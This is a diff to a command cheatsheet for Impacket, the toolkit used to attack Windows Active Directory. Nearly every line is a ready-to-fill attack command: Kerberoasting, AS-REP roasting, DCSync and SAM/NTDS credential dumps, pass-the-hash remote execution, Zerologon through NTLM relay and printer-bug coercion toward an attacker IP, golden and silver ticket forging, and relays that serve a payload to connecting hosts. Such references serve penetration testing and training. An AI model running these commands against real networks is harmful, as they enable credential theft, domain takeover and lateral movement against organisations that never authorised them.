@@ -1,33 +1,149 @@
-% impacket
-# Kerberoast
-GetUserSPNs.py -request -dc-ip [IP address for Domain Controller] cyberpunk.com/[USER]
+% kerberos,kerberoast,dcsync,samdump,wmiexec,psexec,ntlmrelay,zerologon,ticketer,gettgt,impacket
 
-# DCSync
-secretsdump.py -just-dc-user [ACCOUNT] [DOMAIN]/[USERNAME]:[PASSWORD]@[TARGET]
-secretsdump.py 'contoso.local/Administrator@192.168.100.2' -just-dc-user krbtgt
+# Kerberoast: GetUserSPNs
+python3 GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>
+
+# DCSync attack (specific user)
+secretsdump.py -just-dc-user <account> <domain>/<username>:<password>@<target>
+
+# DCSync (example)
+secretsdump.py '<domain>/<username>@<target>' -just-dc-user krbtgt
 
 # Dump local SAM file
-secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+secretsdump.py -sam <sam.save> -security <security.save> -system <system.save> LOCAL
 
-# WMIExec
-impacket-wmiexec n.glover@10.10.120.1
-impacket-wmiexec -hashes AAD3B435B51404EEAAD3B435B51404EE:a6a6591a1fef4938ce2ca6ea255838a9 n.glover@10.10.120.1
+# WMIExec (with and without NTLM hash)
+impacket-wmiexec <user>@<target_ip>
+impacket-wmiexec -hashes <LM>:<NT> <user>@<target_ip>
 
-# Zerologon using NTLM Relay:
-impacket-ntlmrelayx -t DCSYNC://<DCvulnerabletoZL> -smb2support -auth-smb 'DOMAIN/USER:PASSWORD'
-python3 printerbug.py 'DOMAIN/USER:PASSWORD@<OtherDC>' <attackerIP
+# Zerologon via NTLM Relay
+impacket-ntlmrelayx -t DCSYNC://<dc_name> -smb2support -auth-smb '<domain>/<user>:<password>'
+python3 printerbug.py '<domain>/<user>:<password>@<other_dc>' <attacker_ip>
 
-# PSExec
-psexec.py contoso.local/Anakin@192.168.100.10 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
+# PSExec with NTLM hash
+psexec.py <domain>/<user>@<target_ip> -hashes :<ntlm_hash>
 
-# getTGT
-getTGT.py contoso.local/Anakin -dc-ip 192.168.100.2 -hashes :cdeae556dc28c24b5b7b14e9df5b6e21
-export KRB5CCNAME=$(pwd)/Anakin.ccache
-psexec.py contoso.local/Anakin@WS01-10 -target-ip 192.168.100.10 -k -no-pass
-Must use hostname instead of IP; Kerberos requires it to determine the correct service
+# getTGT (Kerberos TGT with NTLM hash)
+getTGT.py <domain>/<user> -dc-ip <dc_ip> -hashes :<ntlm_hash>
 
-# NTLMRelayX
-ntlmrelayx.py -t 192.168.100.10 -smb2support
+# Set Kerberos TGT cache
+export KRB5CCNAME=$(pwd)/<user>.ccache
 
-# Ticketer
-ticketer.py -domain-sid S-1-5-21-1372086773-2238746523-2939299801 -domain contoso.local Administrator -aes 5249e3cf829c979959286c0ee145b7e6b8b8589287bea3c83dd5c9488c40f162
+# Use cached TGT with PSExec (hostname required)
+psexec.py <domain>/<user>@<hostname> -target-ip <target_ip> -k -no-pass
+
+# NTLMRelayX basic relay
+ntlmrelayx.py -t <target_ip> -smb2support
+
+# Ticketer (Golden Ticket with AES-256)
+ticketer.py -domain-sid <domain_sid> -domain <domain> <user> -aes <aes256_hash>
+
+% impacket, windows, exec
+
+# PSEXEC with username
+psexec.py <domain>/<user>:<password>@<ip> 
+
+# PSEXEC with pass the Hash (pth)
+psexec.py -hashes <hash> <user>@<ip> 
+
+# PSEXEC with kerberos
+export KRB5CCNAME=<ccache_file>; psexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name> 
+
+# SMBEXEC with username
+smbexec.py <domain>/<user>:<password>@<ip> 
+
+# SMBEXEC with pass the Hash (pth)
+smbexec.py -hashes <hash> <user>@<ip> 
+
+# SMBEXEC with kerberos
+export KRB5CCNAME=<ccache_file>; smbexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name> 
+
+# wmiexec
+wmiexec.py <domain>/<user>:<password>@<ip> 
+
+# wmiexec with pass the hash (pth) 
+wmiexec.py -hashes <hash> <user>@<ip> 
+
+# atexec - execute command view the task scheduler 
+atexec.py <domain>/<user>:<password>@<ip> "command" 
+
+# atexec pass the hash (pth)
+atexec.py -hashes <hash> <user>@<ip> "command" 
+
+% impacket, windows, kerberos, 88
+
+# GetNPUsers without password to get TGT (ASREPRoasting)
+GetNPUsers.py <domain>/<user> -no-pass -request -format hashcat 
+
+# GetNPUsers - attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ (ASREPRoasting)
+GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat 
+
+# GetUSERSPN - find Service Principal Names that are associated with a normal user account (kerberoasting)
+GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password> 
+
+# MS14-068 - goldenPac
+goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target> 
+
+# Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.
+ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user> 
+
+# Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.
+ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user> 
+
+# TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files used by impacket
+ticketConverter.py <ccache_ticket_file> <ticket_kirbi_file> 
+
+# Silver ticket - impersonate user
+getST.py -spn cifs/<target> <domain>/<netbios_name>\$ -impersonate <user> 
+
+# GetTGT - request a TGT and save it as ccache for given a password, hash or aesKey
+getTGT.py -dc-ip <dc_ip> -hashes <lm_hash>:<nt_hash> <domain>/<user> 
+
+# GetADUser - gather data about the domain’s users and their corresponding email addresses
+GetADUsers.py -all <domain>/<user>:<password> -dc-ip <dc_ip> 
+
+% impacket, windows, smb, 445
+
+# samrdump - system account, shares, etc... (dump info from the Security Account Manager (SAM))
+samrdump.py <domain>/<user>:<password>@<ip> 
+
+# secretsdump
+secretsdump.py '<domain>/<user>:<password>'@<ip> 
+
+# secretsdump local dump - extract hash from sam database
+secretsdump.py  -system <SYSTEM_FILE|SYSTEM> -sam <SAM_FILE|SAM> LOCAL 
+
+# secretsdump local dump - extract hash from ntds.dit
+secretsdump.py  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes <lmhash:nthash> LOCAL -outputfile <ntlm-extract-file> 
+
+# secretsdump - anonymous get administrator - zerologon
+secretsdump.py <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administrator" 
+
+# secretsdump - remote extract
+secretsdump.py -just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip> 
+
+# secretsdump - remote extract + users infos
+secretsdump.py -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip> 
+
+# smbserver - Start a Python implementation of an SMB server.
+smbserver.py <shareName> <sharePath> 
+
+# smbserver - share smb folder with authentication
+smbserver.py -username <username> -password <password> <shareName> <sharePath> 
+
+# ntlmrelay - host a payload that will automatically be served to the remote host connecting
+ntlmrelayx.py -tf <targets_file> -smb2support -e <payload_file|payload.exe> 
+
+# ntlmrelay - socks
+ntlmrelayx.py -tf <targets_file> -socks -smb2support 
+
+# ntlmrelay - authenticate and dump hash
+ntlmrelayx.py -tf <targets_file> -smb2support 
+
+# ntlmrelay - to use with mitm6 - relay to target
+Next use the socks with proxychains : 
+proxychains smbclient //ip/Users -U domain/user 
+ntlmrelayx.py -6 -wh <attacker_ip> -t smb://<target> -l /tmp -socks -debug 
+
+# ntlmrelay - to use with mitm6 - delegate access
+ntlmrelayx.py -t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access 
